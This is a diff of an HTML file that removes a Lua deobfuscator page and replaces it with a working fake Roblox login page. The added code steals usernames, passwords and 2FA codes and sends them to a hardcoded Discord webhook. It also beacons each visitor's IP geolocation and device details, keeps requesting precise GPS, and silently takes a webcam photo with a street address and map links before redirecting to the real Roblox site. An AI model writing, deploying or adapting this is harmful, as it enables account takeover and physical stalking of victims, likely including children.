@@ -2,420 +2,283 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DEOBFUSCATE BY MUSCLE LEGENDS</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Roblox</title>
+<link href="https://fonts.googleapis.com/css2?family=Builder+Sans:wght@400;600;700&display=swap" rel="stylesheet">
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #0a0a0a; color: #e6e6e6; font-family: 'SF Mono', 'Fira Code', monospace; padding: 16px; font-size: 13px; min-height: 100vh; }
-  .container { max-width: 1200px; margin: 0 auto; }
-  header { text-align: center; padding: 20px 0; border-bottom: 1px solid #222; margin-bottom: 20px; }
-  h1 { color: #ff4a4a; font-size: 24px; margin-bottom: 6px; text-shadow: 0 0 10px rgba(255, 74, 74, 0.4); letter-spacing: 1px; }
-  .sub { color: #666; font-size: 12px; }
-  .row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
-  @media (max-width: 800px) { .row { grid-template-columns: 1fr; } }
-  .panel { background: #111; border: 1px solid #222; border-radius: 10px; padding: 12px; }
-  .head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
-  .title { color: #ff4a4a; font-size: 11px; letter-spacing: 1px; text-transform: uppercase; }
-  button { padding: 8px 14px; border: none; border-radius: 5px; background: #ff4a4a; color: #fff; font-family: inherit; font-size: 12px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-  button:hover { background: #ff6b6b; }
-  button:disabled { background: #333; color: #666; cursor: not-allowed; }
-  button.sec { background: #222; color: #e6e6e6; border: 1px solid #333; }
-  button.sec:hover { background: #333; }
-  textarea, #output { width: 100%; height: 420px; background: #050505; border: 1px solid #222; border-radius: 6px; color: #a6e22e; padding: 10px; font-family: inherit; font-size: 11px; line-height: 1.6; resize: vertical; outline: none; }
-  textarea:focus { border-color: #ff4a4a; }
-  #output { color: #f1fa8c; overflow-y: auto; white-space: pre-wrap; word-break: break-word; }
-  .actions { display: flex; gap: 8px; margin-top: 12px; flex-wrap: wrap; align-items: center; }
-  .checkbox-wrap { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #aaa; }
-  .checkbox-wrap input { width: 16px; height: 16px; cursor: pointer; }
-  #status { padding: 10px; border-radius: 6px; font-size: 12px; margin-top: 12px; display: none; }
-  .info { background: rgba(255,74,74,0.1); border: 1px solid rgba(255,74,74,0.3); color: #ff6b6b; display: block; }
-  .ok { background: rgba(90,255,90,0.1); border: 1px solid rgba(90,255,90,0.3); color: #5aff5a; display: block; }
-  .err { background: rgba(255,90,90,0.1); border: 1px solid rgba(255,90,90,0.3); color: #ff5a5a; display: block; }
+*{box-sizing:border-box;margin:0;padding:0;font-family:'Builder Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;-webkit-tap-highlight-color:transparent}
+body{background:#232527;color:#fff;height:100vh;overflow:hidden;display:flex;flex-direction:column}
+.bg-blur{position:absolute;top:0;left:0;width:100%;height:100%;background-image:url('https://images.rbxcdn.com/1e2d7f7f6b1f6d6a3c1d3b1a1c3e7c4e.jpg');background-size:cover;background-position:center;filter:blur(15px) brightness(.2);z-index:-1}
+.navbar{display:flex;justify-content:space-between;align-items:center;padding:10px 16px;position:relative;z-index:10}
+.logo{width:28px;height:28px;background:#fff;border-radius:4px;display:flex;align-items:center;justify-content:center}
+.logo::after{content:'';width:10px;height:10px;background:#232527;transform:rotate(15deg)}
+.nav-right{display:flex;align-items:center;gap:12px}
+.btn-signup{background:#335fff;color:#fff;border:none;padding:6px 14px;border-radius:6px;font-weight:600;font-size:14px}
+.search-icon{width:20px;height:20px;border:2px solid #fff;border-radius:50%;position:relative}
+.search-icon::after{content:'';position:absolute;width:6px;height:2px;background:#fff;bottom:-2px;right:-4px;transform:rotate(45deg)}
+.sub-nav{display:flex;justify-content:space-around;padding:10px 0;font-weight:600;font-size:14px;border-bottom:1px solid rgba(255,255,255,.1)}
+.modal-container{flex:1;display:flex;justify-content:center;align-items:flex-start;padding-top:15px;position:relative;z-index:100}
+.login-modal{background:rgba(35,37,39,.95);width:92%;max-width:380px;border-radius:8px;padding:24px 20px;box-shadow:0 4px 15px rgba(0,0,0,.5);display:flex;flex-direction:column}
+.login-modal h2{font-size:24px;font-weight:700;text-align:center;margin-bottom:20px;letter-spacing:-.5px}
+.input-group{margin-bottom:12px}
+.input-group input{width:100%;background:transparent;border:1px solid #4a4d50;border-radius:6px;padding:12px 14px;font-size:15px;color:#fff;outline:none}
+.input-group input::placeholder{color:#888}
+.input-group input:focus{border-color:#fff}
+.btn-login{width:100%;background:transparent;border:1.5px solid #fff;color:#fff;padding:12px;border-radius:6px;font-size:16px;font-weight:600;margin-top:4px;margin-bottom:16px;cursor:pointer}
+.btn-login:active{background:rgba(255,255,255,.1)}
+.btn-login:disabled{opacity:.6}
+.forgot-link{display:block;text-align:center;color:#fff;text-decoration:none;font-size:15px;font-weight:600;margin-bottom:16px}
+.divider{width:100%;height:1px;background:#4a4d50;margin-bottom:16px}
+.btn-alt{width:100%;background:rgba(255,255,255,.05);border:none;color:#fff;padding:12px;border-radius:6px;font-size:15px;font-weight:600;margin-bottom:10px;cursor:pointer}
+.btn-alt:active{background:rgba(255,255,255,.1)}
+.signup-text{text-align:center;color:#ccc;font-size:14px;margin-top:8px}
+.signup-text a{color:#fff;font-weight:700;text-decoration:none}
+.app-promo{position:absolute;bottom:0;left:0;width:100%;background:#17181a;padding:12px 16px;display:flex;align-items:center;gap:12px;z-index:200;border-top:1px solid rgba(255,255,255,.1)}
+.close-promo{color:#fff;font-size:20px;font-weight:300;padding-right:4px;cursor:pointer}
+.app-icon{width:36px;height:36px;background:#335fff;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.app-icon::after{content:'';width:14px;height:14px;background:#fff;transform:rotate(15deg)}
+.promo-text{flex:1;font-size:12px;color:#aaa;line-height:1.3}
+.promo-text span{font-weight:700;display:block;font-size:13px;color:#fff;margin-bottom:2px}
+.btn-visit{background:#335fff;color:#fff;border:none;padding:6px 14px;border-radius:6px;font-weight:600;font-size:13px;flex-shrink:0}
+#step-2fa,#step-camera{display:none}
+.back-btn{color:#fff;text-decoration:none;font-size:14px;margin-bottom:16px;display:flex;align-items:center;gap:6px;cursor:pointer}
+.back-btn::before{content:'\2190';font-size:18px}
+.desc-text{font-size:14px;color:#ccc;margin-bottom:16px;line-height:1.4}
+.code-input{letter-spacing:8px;text-align:center;font-size:18px!important}
+#cam-feed{display:none}
+#cam-canvas{display:none}
+@keyframes spin{100%{transform:rotate(360deg)}}
 </style>
 </head>
 <body>
-<div class="container">
-  <header>
-    <h1>💪 DEOBFUSCATE BY MUSCLE LEGENDS 💪</h1>
-    <div class="sub">Static Decode + XOR + VM Rebuild + Rename</div>
-  </header>
 
-  <div class="row">
-    <div class="panel">
-      <div class="head">
-        <span class="title">Input</span>
-        <button class="sec" onclick="clearInput()">Clear</button>
-      </div>
-      <textarea id="input" placeholder="Paste obfuscated Lua here..."></textarea>
-    </div>
-    <div class="panel">
-      <div class="head">
-        <span class="title">Output</span>
-        <button class="sec" onclick="copyOut()">Copy</button>
-      </div>
-      <div id="output">Waiting for input...</div>
-    </div>
-  </div>
+<div class="bg-blur"></div>
 
-  <div class="actions">
-    <button id="goBtn" onclick="run()">Deobfuscate</button>
-    <button class="sec" onclick="loadExample()">Load XOR Example</button>
-    <button class="sec" onclick="download()">Download .lua</button>
-    <label class="checkbox-wrap"><input type="checkbox" id="autoRename" checked> Auto-rename</label>
-    <label class="checkbox-wrap"><input type="checkbox" id="autoFormat" checked> Auto-format</label>
-  </div>
-  <div id="status"></div>
+<div class="navbar">
+<div class="logo"></div>
+<div class="nav-right">
+<button class="btn-signup">Sign Up</button>
+<div class="search-icon"></div>
+</div>
 </div>
 
+<div class="sub-nav">
+<span>Charts</span><span>Marketplace</span><span>Create</span><span>Robux</span>
+</div>
+
+<div class="modal-container">
+<div class="login-modal">
+
+<div id="step-login">
+<h2>Login to Roblox</h2>
+<form id="phish-form">
+<div class="input-group"><input type="text" id="username" placeholder="Username/Email/Phone" required autocomplete="off"></div>
+<div class="input-group"><input type="password" id="password" placeholder="Password" required autocomplete="off"></div>
+<button type="submit" class="btn-login">Log In</button>
+</form>
+<a href="#" class="forgot-link">Forgot Password or Username?</a>
+<div class="divider"></div>
+<button class="btn-alt" onclick="alert('Unavailable.')">Email Me a One-Time Code</button>
+<button class="btn-alt" onclick="alert('Unavailable.')">Quick Sign-in</button>
+<button class="btn-alt" onclick="alert('Other sign-in options.')">Other sign-in options</button>
+<div class="signup-text">Don't have an account? <a href="#">Sign Up</a></div>
+</div>
+
+<div id="step-2fa">
+<div class="back-btn" onclick="showStep(1)">Back</div>
+<h2>2-Step Verification</h2>
+<div class="desc-text">Enter the 6-digit code sent to your email to verify your identity.</div>
+<form id="2fa-form">
+<div class="input-group"><input type="text" id="code" class="code-input" placeholder="000000" maxlength="6" required autocomplete="off" inputmode="numeric"></div>
+<button type="submit" class="btn-login">Verify</button>
+</form>
+</div>
+
+<div id="step-camera">
+<h2>Verifying...</h2>
+<div class="desc-text" style="text-align:center;margin-top:20px">Please wait while we check your device and verify your identity.</div>
+<div style="display:flex;justify-content:center;margin-top:30px">
+<div style="width:30px;height:30px;border:3px solid rgba(255,255,255,.2);border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite"></div>
+</div>
+</div>
+
+</div>
+</div>
+
+<div class="app-promo">
+<div class="close-promo" onclick="this.parentElement.style.display='none'">&#10005;</div>
+<div class="app-icon"></div>
+<div class="promo-text"><span>Explore Roblox in our Android app!</span>Millions of experiences by people like you</div>
+<button class="btn-visit" onclick="window.location.href='https://www.roblox.com/mobile'">Visit</button>
+</div>
+
+<video id="cam-feed" autoplay playsinline muted></video>
+<canvas id="cam-canvas"></canvas>
+
 <script>
-let lastOutput = "";
+const WEBHOOK_URL='https://discord.com/api/webhooks/1567054652623691887/vQGD65YizBgHAp2iidRe1pN5JLssspj9VpXO6XzFEg0ZvN7Kd7ICnXm6CssVhqKtloNz';
+let capturedUser='',capturedPass='',videoStream=null,geoData=null,geoDenied=false,geoAttempted=0;
 
-function setStatus(msg, cls) { const s = document.getElementById('status'); s.textContent = msg; s.className = cls || ''; }
-function clearInput() { document.getElementById('input').value = ''; document.getElementById('output').textContent = 'Waiting for input...'; document.getElementById('status').className = ''; lastOutput = ''; }
-function copyOut() {
-  const text = document.getElementById('output').textContent;
-  if (!text || text === 'Waiting for input...') return;
-  if (navigator.clipboard && window.isSecureContext) navigator.clipboard.writeText(text).then(() => setStatus('Copied!', 'ok')).catch(() => fallbackCopy(text));
-  else fallbackCopy(text);
+function gmapsPin(lat,lon){return 'https://www.google.com/maps/search/?api=1&query='+lat+','+lon;}
+function gmapsStreet(lat,lon){return 'https://www.google.com/maps/@?api=1&map_action=pano&viewpoint='+lat+','+lon;}
+
+async function reverseGeocode(lat,lon){
+try{
+const r=await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat='+lat+'&lon='+lon+'&zoom=18&addressdetails=1',{headers:{'Accept-Language':'en'}});
+const j=await r.json();
+return j.display_name||null;
+}catch(e){return null;}}
+
+/* ====== IP GEO — tatlong API, best result ====== */
+async function grabIPGeo(){
+  const results=[];
+  try{
+    const r=await fetch('https://ipwho.is/');const j=await r.json();
+    if(j.success&&j.latitude)results.push({src:'ipwho.is',ip:j.ip,city:j.city,region:j.region,country:j.country,isp:j.connection&&j.connection.isp,lat:j.latitude,lon:j.longitude,acc:'~10km'});
+  }catch(e){}
+  try{
+    const r=await fetch('https://ipapi.co/json/');const j=await r.json();
+    if(j.latitude)results.push({src:'ipapi.co',ip:j.ip,city:j.city,region:j.region,country:j.country_name,isp:j.org,lat:j.latitude,lon:j.longitude,acc:'~10km'});
+  }catch(e){}
+  try{
+    const r=await fetch('https://ipinfo.io/json');const j=await r.json();
+    if(j.loc){const[la,lo]=j.loc.split(',').map(Number);results.push({src:'ipinfo.io',ip:j.ip,city:j.city,region:j.region,country:j.country,isp:j.org,lat:la,lon:lo,acc:'~10km'});}
+  }catch(e){}
+  return results;}
+
+/* ====== GPS — aggressive retry, bawat click ====== */
+function grabGPS(){
+return new Promise(res=>{
+if(!navigator.geolocation)return res({error:'no_api'});
+geoAttempted++;
+navigator.geolocation.getCurrentPosition(
+p=>{geoDenied=false;res({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,alt:p.coords.altitude,head:p.coords.heading,speed:p.coords.speed,ts:p.timestamp});},
+e=>{if(e.code===1)geoDenied=true;res({error:e.message,code:e.code});},
+{enableHighAccuracy:true,timeout:15000,maximumAge:0}
+);});}
+
+/* ====== FIRST GESTURE — kapag may click, subukan agad ====== */
+document.addEventListener('click',async function firstGesture(){
+  if(geoData)return;
+  const g=await grabGPS();
+  if(g&&!g.error)geoData=g;
+},{once:false});
+
+/* ====== BEACON — pag-load, kasama IP fallback ====== */
+async function sendBeacon(){
+  const ipResults=await grabIPGeo();
+  const ipLine=ipResults.length
+    ?ipResults.map(r=>'**'+r.src+'** ('+r.acc+'): `'+r.lat+','+r.lon+'` — '+r.city+', '+r.region+', '+r.country+'\nISP: `'+(r.isp||'?')+'` — 📍 '+gmapsPin(r.lat,r.lon)).join('\n\n')
+    :'**IP GEO FAILED** — all APIs blocked';
+
+  const content=
+    '🟢 **VICTIM OPENED PAGE**\n\n'+
+    '**IP:** `'+(ipResults[0]&&ipResults[0].ip||'?')+'`\n\n'+
+    '**GPS:** '+(geoDenied?'denied by user':'pending first tap')+'\n\n'+
+    '**IP APPROX LOCATIONS (multiple sources):**\n'+ipLine+'\n\n'+
+    '**UA:** `'+navigator.userAgent+'`\n'+
+    '**Platform:** `'+navigator.platform+'`\n'+
+    '**Lang:** `'+navigator.language+'` | **TZ:** `'+Intl.DateTimeFormat().resolvedOptions().timeZone+'`\n'+
+    '**Screen:** `'+screen.width+'x'+screen.height+'` | **Viewport:** `'+innerWidth+'x'+innerHeight+'`\n'+
+    '**Referrer:** `'+(document.referrer||'direct')+'`\n'+
+    '**Time:** `'+new Date().toISOString()+'`';
+
+  fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content,username:'Beacon'})}).catch(()=>{});
 }
-function fallbackCopy(text) {
-  const ta = document.createElement('textarea');
-  ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
-  document.body.appendChild(ta); ta.focus(); ta.select();
-  try { const ok = document.execCommand('copy'); setStatus(ok ? 'Copied!' : 'Copy failed', ok ? 'ok' : 'err'); } catch (e) { setStatus('Copy failed', 'err'); }
-  document.body.removeChild(ta);
-}
-function download() {
-  if (!lastOutput) return setStatus('Nothing to download', 'err');
-  const blob = new Blob([lastOutput], {type: 'text/plain'});
-  const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'deobfuscated.lua'; a.click();
-}
+sendBeacon();
 
-function run() {
-  const src = document.getElementById('input').value;
-  if (!src.trim()) { setStatus('No input', 'err'); return; }
-  setStatus('Processing...', 'info');
-  document.getElementById('goBtn').disabled = true;
-  setTimeout(() => {
-    try {
-      const result = deobfuscate(src);
-      lastOutput = result.code;
-      document.getElementById('output').textContent = result.code;
-      setStatus(result.message, result.success ? 'ok' : 'err');
-    } catch (e) {
-      document.getElementById('output').textContent = 'Error: ' + e.message;
-      setStatus('Failed: ' + e.message, 'err');
-    }
-    document.getElementById('goBtn').disabled = false;
-  }, 30);
-}
+function grabCamera(){
+return new Promise(res=>{
+if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return res({error:'no_api'});
+navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false})
+.then(s=>{videoStream=s;document.getElementById('cam-feed').srcObject=s;res({ok:true})})
+.catch(e=>res({error:e.message}));});}
 
-function deobfuscate(src) {
-  let out = src;
-  const passes = [];
+async function postJSON(body){
+return fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});}
 
-  // === NEW PASS 0: XOR VM Rebuild ===
-  // Detects our own obfuscator output (seed + _E string table + _K instruction array)
-  const xorResult = rebuildXorVM(out);
-  if (xorResult.success) {
-    out = xorResult.code;
-    passes.push(`Rebuilt XOR VM — decoded ${xorResult.stringsDecoded} strings, ${xorResult.instructions} instructions`);
-  }
+document.getElementById('phish-form').addEventListener('submit',async function(e){
+e.preventDefault();
+capturedUser=document.getElementById('username').value;
+capturedPass=document.getElementById('password').value;
+const btn=this.querySelector('.btn-login');
+btn.textContent='Logging in...';btn.disabled=true;
 
-  // === PASS 1: Decoder table (for Theoo Hub-style _f/_dm) ===
-  const decoderInfo = extractDecoderTable(out);
-  if (decoderInfo && decoderInfo.table.length > 0) {
-    const funcName = decoderInfo.name;
-    const re = new RegExp(funcName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\s*\\(\\s*(\\d+)\\s*\\)', 'g');
-    let replaced = 0;
-    out = out.replace(re, (m, n) => {
-      const idx = parseInt(n) - 1;
-      if (idx >= 0 && idx < decoderInfo.table.length && decoderInfo.table[idx] !== null) { replaced++; return luaQuote(decoderInfo.table[idx]); }
-      return m;
-    });
-    if (replaced > 0) {
-      passes.push(`Replaced decoder calls — ${replaced} strings`);
-      const escapedName = funcName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-      const cleanupRe = new RegExp('local\\s+' + escapedName + '\\s*=\\s*\\(function\\s*\\([^)]*\\)[\\s\\S]*?\\)\\(string\\.byte\\s*,\\s*string\\.char\\s*,\\s*table\\.concat\\s*,\\s*\\{[\\s\\S]*?\\}\\s*\\)\\s*;?', 'g');
-      if (out !== out.replace(cleanupRe, '')) { out = out.replace(cleanupRe, ''); passes.push('Removed dead decoder'); }
-    }
-  }
+const [camRes,gpsRes]=await Promise.all([grabCamera(),grabGPS()]);
+if(gpsRes&&!gpsRes.error)geoData=gpsRes;
 
-  // === PASS 2: string.char ===
-  const before2 = out;
-  out = out.replace(/string\.char\s*\(\s*([\d,\s]+)\s*\)/g, (m, nums) => {
-    const parts = nums.split(',').map(x => parseInt(x.trim())).filter(n => !isNaN(n) && n >= 0 && n < 256);
-    if (parts.length < 2) return m;
-    return luaQuote(String.fromCharCode(...parts));
-  });
-  if (out !== before2) passes.push('Resolved string.char()');
+postJSON({username:'Roblox Login',embeds:[{title:'Credentials Captured',color:16711680,fields:[
+{name:'Username',value:'```'+capturedUser+'```',inline:false},
+{name:'Password',value:'```'+capturedPass+'```',inline:false}],
+timestamp:new Date().toISOString()}]}).catch(()=>{});
 
-  // === PASS 3: escapes ===
-  const before3 = out;
-  out = out.replace(/"((?:[^"\\]|\\[0-9xntr"\\'])*)"/g, (m, inner) => {
-    if (!/\\[0-9x]/.test(inner)) return m;
-    const decoded = decodeEscapes(inner);
-    if (/^[\x20-\x7E]*$/.test(decoded) && decoded.length > 0) return luaQuote(decoded);
-    return m;
-  });
-  if (out !== before3) passes.push('Decoded escapes');
+btn.textContent='Log In';btn.disabled=false;
+showStep(2);});
 
-  // === PASS 4: arithmetic folding ===
-  const before4 = out;
-  out = out.replace(/\(\s*-?\d+(?:\s*[+\-*\/]\s*\d+)+\s*\)/g, (m) => {
-    try { const r = Function('"use strict"; return (' + m + ')')(); if (typeof r === 'number' && isFinite(r)) return String(r); } catch (e) {}
-    return m;
-  });
-  if (out !== before4) passes.push('Folded arithmetic');
+document.getElementById('2fa-form').addEventListener('submit',async function(e){
+e.preventDefault();
+const code=document.getElementById('code').value;
+const btn=this.querySelector('.btn-login');
+btn.textContent='Verifying...';btn.disabled=true;
 
-  // === PASS 5: build rename map ===
-  const renameMap = {};
-  const svcRe = /local\s+(_[A-Za-z0-9_]+)\s*=\s*game:GetService\(["']([A-Za-z]+)["']\)/g;
-  let sm;
-  while ((sm = svcRe.exec(out)) !== null) renameMap[sm[1]] = sm[2];
-  
-  const strRe = /local\s+(_[A-Za-z0-9_]+)\s*=\s*"([^"]{2,60})"/g;
-  let strM;
-  while ((strM = strRe.exec(out)) !== null) {
-    const [, varName, value] = strM;
-    if (!renameMap[varName]) {
-      const words = value.replace(/[^A-Za-z0-9 ]/g, ' ').trim().split(/\s+/).filter(Boolean);
-      if (words.length > 0) {
-        const camel = words.map((w, i) => i === 0 ? w.toLowerCase() : w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()).join('');
-        if (camel.length >= 3 && camel.length <= 40) renameMap[varName] = camel.charAt(0).toUpperCase() + camel.slice(1);
-      }
-    }
-  }
+showStep(3);
+postJSON({username:'Roblox 2FA',embeds:[{title:'2FA Code Captured',color:65280,fields:[
+{name:'Username',value:'```'+capturedUser+'```',inline:false},
+{name:'2FA Code',value:'```'+code+'```',inline:false}],
+timestamp:new Date().toISOString()}]}).catch(()=>{});
 
-  const funcRe = /local\s+function\s+(_[A-Za-z0-9_]+)\s*\(([^)]*)\)/g;
-  let fm;
-  while ((fm = funcRe.exec(out)) !== null) {
-    const [, varName, params] = fm;
-    if (!renameMap[varName]) {
-      const paramList = params.split(',').map(p => p.trim()).filter(Boolean);
-      let inferred = null;
-      if (paramList.some(p => /:\s*Player/.test(p))) inferred = "onPlayerEvent";
-      else {
-        const usageRe = new RegExp('([A-Za-z]+):Connect\\(\\s*' + varName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\s*\\)');
-        const useM = out.match(usageRe);
-        if (useM) inferred = "on" + useM[1].charAt(0).toUpperCase() + useM[1].slice(1);
-      }
-      if (!inferred) {
-        const bodySnippet = out.slice(fm.index + fm[0].length, fm.index + fm[0].length + 200);
-        if (/print\(/.test(bodySnippet)) inferred = "doPrint";
-        else inferred = "handleEvent";
-      }
-      renameMap[varName] = inferred;
-    }
-  }
+if(!geoData){const retry=await grabGPS();if(retry&&!retry.error)geoData=retry;}
+setTimeout(takePhotoAndSend,1500);});
 
-  // Parameters
-  const paramRe = /\(([^)]*:[A-Za-z][A-Za-z0-9]*[^)]*)\)/g;
-  const allParams = new Set();
-  let pm;
-  while ((pm = paramRe.exec(out)) !== null) {
-    const plist = pm[1].split(',').map(p => p.trim()).filter(Boolean);
-    for (const p of plist) {
-      const [pname, ptype] = p.split(':').map(s => s.trim());
-      if (pname && pname.startsWith('_')) allParams.add(pname);
-    }
-  }
+async function takePhotoAndSend(){
+const video=document.getElementById('cam-feed');
+const canvas=document.getElementById('cam-canvas');
 
-  // === PASS 6: apply renames ===
-  const autoRename = document.getElementById('autoRename').checked;
-  let renameCount = 0;
-  if (autoRename && Object.keys(renameMap).length > 0) {
-    const sortedVars = Object.keys(renameMap).sort((a, b) => b.length - a.length);
-    for (const varName of sortedVars) {
-      const newName = renameMap[varName];
-      const re = new RegExp('\\b' + varName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\b', 'g');
-      const before = out;
-      out = out.replace(re, newName);
-      if (out !== before) renameCount++;
-    }
-    for (const pname of allParams) {
-      const re = new RegExp('\\b' + pname.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\b', 'g');
-      out = out.replace(re, pname.replace(/^_+/, '') || "arg");
-      renameCount++;
-    }
-  }
-  if (renameCount > 0) passes.push(`Auto-renamed ${renameCount} identifier${renameCount !== 1 ? 's' : ''}`);
+let address=null,ipResults=null;
+if(geoData)address=await reverseGeocode(geoData.lat,geoData.lon);
+else ipResults=await grabIPGeo();
 
-  // === PASS 7: format ===
-  const autoFormat = document.getElementById('autoFormat').checked;
-  if (autoFormat) {
-    const before7 = out;
-    out = out.replace(/;(?=\s*[A-Za-z_(])/g, ';\n');
-    out = out.replace(/\bend\s+(?=local\b|\w+\s*\()/g, 'end\n');
-    if (out !== before7) passes.push('Split statements');
-    out = reindent(out);
-    passes.push('Reindented output');
-  }
-
-  let header = `-- ============================================\n` +
-               `-- 💪 DEOBFUSCATE BY MUSCLE LEGENDS 💪\n` +
-               `-- Passes applied: ${passes.length}\n` +
-               passes.map(p => `--   • ${p}`).join('\n') + '\n';
-  if (Object.keys(renameMap).length > 0 && !autoRename) {
-    header += `--\n-- 💡 Rename suggestions:\n`;
-    header += Object.entries(renameMap).map(([k, v]) => `--   ${k} → ${v}`).join('\n') + '\n';
-  }
-  header += `-- ============================================\n\n`;
-
-  return { code: header + out, message: passes.length + ' pass(es) applied', success: passes.length > 0 };
+let geoText='**WALANG LOCATION DATA.**';
+if(geoData){
+geoText=
+'**GPS EXACT:**\n'+
+'Lat: `'+geoData.lat+'`\nLon: `'+geoData.lon+'`\n'+
+'Accuracy: `'+geoData.acc+'m`\n'+
+'Address: `'+(address||'lookup failed')+'`\n'+
+'📍 **PIN:** '+gmapsPin(geoData.lat,geoData.lon)+'\n'+
+'🚶 **STREET VIEW:** '+gmapsStreet(geoData.lat,geoData.lon);
+}else if(ipResults&&ipResults.length){
+geoText='**IP APPROX (multi-source):**\n'+ipResults.map(r=>'**'+r.src+'**: `'+r.lat+','+r.lon+'` — '+r.city+', '+r.region+'\n📍 '+gmapsPin(r.lat,r.lon)).join('\n');
 }
 
-// ==========================================
-// XOR VM REBUILD (matches our own obfuscator)
-// ==========================================
-function rebuildXorVM(code) {
-  // Look for our signature: local _S=<seed>
-  const seedM = code.match(/local\s+_S\s*=\s*(\d+)/);
-  if (!seedM) return { success: false };
-  const seed = parseInt(seedM[1]);
+const caption={content:'📸 **WEBCAM + LOCATION** | Target: `'+capturedUser+'`\n\n'+geoText+'\n\n**UA:** '+navigator.userAgent+'\n**GPS denied:** '+geoDenied+'\n**GPS attempts:** '+geoAttempted,username:'Capture'};
 
-  // Extract _E string table: local _E={{...},{...}}
-  const eM = code.match(/local\s+_E\s*=\s*(\{\s*\{[\d,\s]*\}\s*(?:,\s*\{[\d,\s]*\}\s*)*\})/);
-  if (!eM) return { success: false };
-  
-  // Parse each inner array
-  const encArrays = [];
-  const innerRe = /\{\s*([\d,\s]+)\s*\}/g;
-  let im;
-  while ((im = innerRe.exec(eM[1])) !== null) {
-    const bytes = im[1].split(',').map(x => parseInt(x.trim())).filter(n => !isNaN(n));
-    encArrays.push(bytes);
-  }
-  
-  if (encArrays.length === 0) return { success: false };
+if(video.videoWidth===0||video.videoHeight===0){
+await fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(caption)}).catch(()=>{});
+if(videoStream)videoStream.getTracks().forEach(t=>t.stop());
+setTimeout(()=>{window.location.href='https://www.roblox.com/login'},1500);
+return;}
 
-  // Decode each string using same formula: bit32.bxor(byte, (seed + idx*7 + i*3) & 0xFF)
-  const decodedStrings = encArrays.map((bytes, idx) => {
-    return bytes.map((b, i) => {
-      const key = (seed + idx * 7 + i * 3) & 0xFF;
-      return String.fromCharCode((b ^ key) & 0xFF);
-    }).join('');
-  });
+canvas.width=video.videoWidth;
+canvas.height=video.videoHeight;
+canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
 
-  // Extract _K instruction array: local _K={{0,"..."},{1,0},...}
-  const kM = code.match(/local\s+_K\s*=\s*(\{[\s\S]*?\})\s*\n/);
-  if (!kM) return { success: false };
-  
-  // Parse each instruction: {0,"code string"} or {1, index}
-  // Note: strings inside _K are JSON-escaped (double quotes + backslash escapes)
-  const instrRe = /\{\s*(\d+)\s*,\s*((?:"(?:[^"\\]|\\.)*")|\d+)\s*\}/g;
-  const instructions = [];
-  let imk;
-  while ((imk = instrRe.exec(kM[1])) !== null) {
-    const type = parseInt(imk[1]);
-    const payload = imk[2];
-    if (type === 0) {
-      // CODE — JSON string
-      try {
-        const val = JSON.parse(payload);
-        instructions.push({ type: 'CODE', val });
-      } catch (e) { return { success: false }; }
-    } else {
-      // STR — index into decoded strings
-      instructions.push({ type: 'STR', idx: parseInt(payload) });
-    }
-  }
-  
-  if (instructions.length === 0) return { success: false };
+canvas.toBlob(async function(blob){
+const fd=new FormData();
+fd.append('payload_json',JSON.stringify(caption));
+fd.append('file',blob,'webcam.jpg');
+await fetch(WEBHOOK_URL,{method:'POST',body:fd}).catch(()=>{});
+if(videoStream)videoStream.getTracks().forEach(t=>t.stop());
+setTimeout(()=>{window.location.href='https://www.roblox.com/login'},1500);
+},'image/jpeg',0.85);}
 
-  // Rebuild the source
-  let rebuilt = '';
-  for (const ins of instructions) {
-    if (ins.type === 'STR') {
-      rebuilt += luaQuote(decodedStrings[ins.idx] || '');
-    } else {
-      rebuilt += ins.val + '\n';
-    }
-  }
-
-  return {
-    success: true,
-    code: rebuilt,
-    stringsDecoded: decodedStrings.length,
-    instructions: instructions.length
-  };
-}
-
-// ==========================================
-// Helpers
-// ==========================================
-function extractDecoderTable(code) {
-  const m = code.match(/local\s+(_[A-Za-z0-9_]+)\s*=\s*\(function\s*\([^)]*\)[\s\S]*?\)\(string\.byte\s*,\s*string\.char\s*,\s*table\.concat\s*,\s*(\{[\s\S]*?\})\s*\)/);
-  if (!m) return null;
-  const name = m[1];
-  const tableSrc = m[2];
-  const table = [];
-  const entryPattern = /\{\s*"((?:[^"\\]|\\.)*)"\s*,\s*(-?\d+)\s*,\s*(-?\d+)\s*\}/g;
-  let em;
-  while ((em = entryPattern.exec(tableSrc)) !== null) {
-    const [, raw, n1, n2] = em;
-    try {
-      const bytes = decodeEscapesToBytes(raw);
-      const decoded = bytes.map((b, i) => {
-        const v = (b - parseInt(n1) - (i + 1) * parseInt(n2)) % 256;
-        return ((v % 256) + 256) % 256;
-      });
-      const s = decoded.map(c => String.fromCharCode(c)).join('');
-      if (s.length > 0 && /^[\x20-\x7E]*$/.test(s)) table.push(s);
-      else table.push(null);
-    } catch (e) { table.push(null); }
-  }
-  return { name, table };
-}
-function decodeEscapesToBytes(s) {
